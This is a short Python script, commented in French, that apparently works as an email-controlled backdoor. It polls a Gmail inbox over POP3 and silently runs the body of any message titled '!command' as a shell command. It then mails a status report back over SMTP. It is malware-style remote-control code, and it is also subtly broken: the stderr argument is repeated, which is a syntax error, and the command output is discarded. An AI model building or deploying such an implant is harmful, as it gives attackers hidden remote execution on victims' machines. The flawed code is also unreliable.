import poplib
import time
import subprocess
import smtplib
import os
from email import message_from_bytes
from dotenv import load_dotenv

# Charger les variables d'environnement à partir d'un fichier .env
load_dotenv()

# Récupérer les informations d'authentification à partir des variables d'environnement
USERNAME = os.getenv('GMAIL_USERNAME')
PASSWORD = os.getenv('GMAIL_PASSWORD')
SENDTO = os.getenv('SENDTO_EMAIL')
popserver = 'pop.gmail.com'

def send_mail(subject, body):
    """Envoyer un e-mail"""
    msg = f"Subject: {subject}\n\n{body}"
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(USERNAME, PASSWORD)
    server.sendmail(USERNAME, SENDTO, msg)
    server.quit()

def execute_command(command):
    """Exécuter une commande shell de manière silencieuse"""
    try:
        # Rediriger la sortie standard, la sortie d'erreur et les logs vers NUL sous Windows
        output = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return "Command executed successfully."
    except subprocess.CalledProcessError as e:
        return f"Error executing command: {e}"


def main():
    """Fonction principale"""
    while True:
        try:
            # Connexion au serveur POP3
            pop = poplib.POP3_SSL(popserver)
            pop.user(USERNAME)
            pop.pass_(PASSWORD)

            # Récupération du nombre total de messages
            count, _ = pop.stat()

            # Récupération du dernier message
            _, lines, _ = pop.retr(count)
            
            # Analyse de l'e-mail
            email_message = message_from_bytes(b'\n'.join(lines))

            # Vérification si l'e-mail contient une commande
            if email_message['Subject'] == "!command":
                command = email_message.get_payload()

                # Exécution de la commande
                command_output = execute_command(command)

                # Envoi de la sortie de la commande par e-mail
                send_mail("Output of command execution", command_output)

            # Attendre pendant une courte période avant de vérifier les nouveaux e-mails
            time.sleep(10)
        except Exception as e:
            print(f"Une erreur s'est produite : {e}")

if __name__ == "__main__":
    main()

